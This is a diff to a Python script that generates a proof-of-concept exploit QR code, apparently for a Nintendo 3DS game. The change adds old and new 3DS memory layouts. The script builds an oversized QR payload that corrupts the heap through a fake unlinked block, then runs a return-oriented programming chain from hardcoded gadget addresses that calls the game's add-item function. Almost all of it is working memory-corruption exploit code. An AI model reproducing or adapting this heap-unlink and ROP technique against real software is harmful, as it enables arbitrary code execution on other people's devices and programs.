@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
+import argparse
 import os
 import struct
+from dataclasses import dataclass
 
 import qrcode
 import qrcode.base
@@ -10,7 +12,7 @@ from qrcode.constants import ERROR_CORRECT_L
 from qrcode.util import BitBuffer, create_bytes
 
 # QR result buffer and adjacent heap blocks.
-B = 0x32654B24
+B = 0x32648924
 P = B + 0x40
 N = B + 0x997B4
 H0 = B - 0x1C0628
@@ -19,10 +21,33 @@ NEXT_BLOCK_ADDR = N + 0x480
 N_CAP = 0x00000458
 N_FLAGS = 0x04070000
 
-# Game objects
-FIELD_ENTRY_ADDR = 0x08E42A9C
-TARGET_REF_ADDR = FIELD_ENTRY_ADDR + 0x14  # 0x08E42AB0
 
+# Layout-specific addresses and output names.
+@dataclass(frozen=True)
+class Layout:
+    field_entry: int
+    exit_r8: int
+    output: str
+
+    @property
+    def target_ref(self) -> int:
+        return self.field_entry + 0x14
+
+
+LAYOUTS = {
+    "old3ds": Layout(
+        field_entry=0x08E42A9C,
+        exit_r8=0x08E42A88,
+        output="ywb_qr_poc.png",
+    ),
+    "new3ds": Layout(
+        field_entry=0x0CA42A9C,
+        exit_r8=0x0CA42A88,
+        output="ywb_qr_poc_new3ds.png",
+    ),
+}
+
+# Game objects
 DEV = 0x006B8A60
 
 # Game data
@@ -47,7 +72,6 @@ ADD_ITEM_FUNC = 0x003C7144  # Add an item (R0 = ID, R1 = quantity).
 # Return stack and registers.
 EXIT_SP = 0x0FFFFEB8
 EXIT_PC = 0x0012AD08
-EXIT_R8 = 0x08E42A88
 EXIT_R10 = 0x006B9028
 EXIT_R11 = 0x006B8B5C
 
@@ -73,7 +97,7 @@ def p32(buf, off, val):
     struct.pack_into("<I", buf, off, val)
 
 
-def build_fake_object():
+def build_fake_object(layout: Layout):
     b = bytearray(OBJ_LEN)
     object_addr = P
     exit_r9_slot_addr = object_addr + EXIT_CTX_OFF + 0x24
@@ -94,13 +118,13 @@ def build_fake_object():
     p32(b, INITIAL_STACK_OFF + 0x18, POP_R1_PC)  # POP_LR_PC LR
     p32(b, INITIAL_STACK_OFF + 0x1C, POP_R1_PC)  # POP_LR_PC PC
 
-    # Store [FIELD_ENTRY_ADDR+4] + 0x30 in [TARGET_REF_ADDR] and the exit R9 slot.
-    p32(b, INITIAL_STACK_OFF + 0x20, FIELD_ENTRY_ADDR)
+    # Store [FIELD_ENTRY+4] + 0x30 in [TARGET_REF] and the exit R9 slot.
+    p32(b, INITIAL_STACK_OFF + 0x20, layout.field_entry)
     p32(b, INITIAL_STACK_OFF + 0x24, LDR_R0_R1_PLUS4)  # LDR R0,[R1,#4]
     p32(b, INITIAL_STACK_OFF + 0x28, ADD18)
     p32(b, INITIAL_STACK_OFF + 0x2C, ADD18)  # ADD R0,R0,#0x18
-    p32(b, INITIAL_STACK_OFF + 0x30, TARGET_REF_ADDR)
-    p32(b, INITIAL_STACK_OFF + 0x34, STR_R0_R1)  # [TARGET_REF_ADDR] = R0
+    p32(b, INITIAL_STACK_OFF + 0x30, layout.target_ref)
+    p32(b, INITIAL_STACK_OFF + 0x34, STR_R0_R1)  # [TARGET_REF] = R0
     p32(b, INITIAL_STACK_OFF + 0x38, exit_r9_slot_addr)
     p32(b, INITIAL_STACK_OFF + 0x3C, STR_R0_R1)  # [exit_r9_slot_addr] = R0
     p32(b, INITIAL_STACK_OFF + 0x44, POP_R0_TO_R3_R10_PC)  # next: [N] = Dev
@@ -125,7 +149,7 @@ def build_fake_object():
     # Exit context: add the item and return to the caller.
     p32(b, EXIT_CTX_OFF + 0x00, ITEM_ID)
     p32(b, EXIT_CTX_OFF + 0x04, ITEM_QTY)
-    p32(b, EXIT_CTX_OFF + 0x20, EXIT_R8)
+    p32(b, EXIT_CTX_OFF + 0x20, layout.exit_r8)
     # EXIT_CTX_OFF+0x24 (exit R9) is filled by the chain.
     p32(b, EXIT_CTX_OFF + 0x28, EXIT_R10)
     p32(b, EXIT_CTX_OFF + 0x2C, EXIT_R11)
@@ -154,7 +178,7 @@ def build_fake_object():
     return b
 
 
-def build_fake_heap_header():
+def build_fake_heap_header(layout: Layout):
     b = bytearray(40)
     # ctrl=0: during the H0 free, sub_158AA0(Dev,N) sees [N]!=Dev and
     # returns, so N stays in the physical list until the FREE_BLOCK_FUNC call.
@@ -165,15 +189,15 @@ def build_fake_heap_header():
     p32(b, 0x08, NEXT_BLOCK_ADDR)  # next physical block
     p32(b, 0x18, N_CAP)  # size used when H0+N are coalesced
     p32(b, 0x1C, N_FLAGS)  # bit24 clear = free block
-    p32(b, 0x20, P)  # fake fd -> unlink writes [TARGET_REF_ADDR]=P
-    p32(b, 0x24, TARGET_REF_ADDR - 0x20)  # fake bk
+    p32(b, 0x20, P)  # fake fd -> unlink writes [TARGET_REF]=P
+    p32(b, 0x24, layout.target_ref - 0x20)  # fake bk
     return b
 
 
-def build_first_segment():
+def build_first_segment(layout: Layout):
     b = bytearray(FIRST_SEGMENT_LEN)
     b[0:PREFIX_LEN] = b'\xEC' * PREFIX_LEN
-    blk = build_fake_object()
+    blk = build_fake_object(layout)
     b[PREFIX_LEN:PREFIX_LEN + len(blk)] = blk
     return b
 
@@ -191,7 +215,7 @@ def build_declared_lengths(total):
 DECLARED_LENGTHS = build_declared_lengths(N - (B + 37) - FIRST_SEGMENT_LEN)
 
 
-def build_bitstream():
+def build_bitstream(layout: Layout):
     bits = []
 
     def put(val, n):
@@ -200,7 +224,7 @@ def build_bitstream():
 
     put(0b0100, 4)
     put(FIRST_SEGMENT_LEN, 16)
-    for by in build_first_segment():
+    for by in build_first_segment(layout):
         put(by, 8)
     for count in DECLARED_LENGTHS:
         put(0b0011, 4)
@@ -211,7 +235,7 @@ def build_bitstream():
         put(count, 16)
     put(0b0100, 4)
     put(40, 16)
-    for by in build_fake_heap_header():
+    for by in build_fake_heap_header(layout):
         put(by, 8)
     put(0b0000, 4)
     while len(bits) % 8:
@@ -225,12 +249,12 @@ def build_bitstream():
     return out
 
 
-def build_image():
+def build_image(layout: Layout):
     scale = 8
     border = 4
     rs = qrcode.base.rs_blocks(QR_VERSION, QR_ECC)
     cap = sum(block.data_count for block in rs)
-    data = build_bitstream()
+    data = build_bitstream(layout)
     i = 0
     while len(data) < cap:
         data.append(0xEC if i % 2 == 0 else 0x11)
@@ -263,8 +287,15 @@ def build_image():
                     for dx in range(scale):
                         img.putpixel((x0 + dx, y0 + dy), 0)
     here = os.path.dirname(os.path.abspath(__file__))
-    img.save(os.path.join(here, "ywb_qr_poc.png"))
+    img.save(os.path.join(here, layout.output))
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Generate the YWB PoC QR image.")
+    parser.add_argument("--layout", choices=tuple(LAYOUTS), default="old3ds")
+    args = parser.parse_args()
+    build_image(LAYOUTS[args.layout])
 
 
 if __name__ == "__main__":
-    build_image()
+    main()
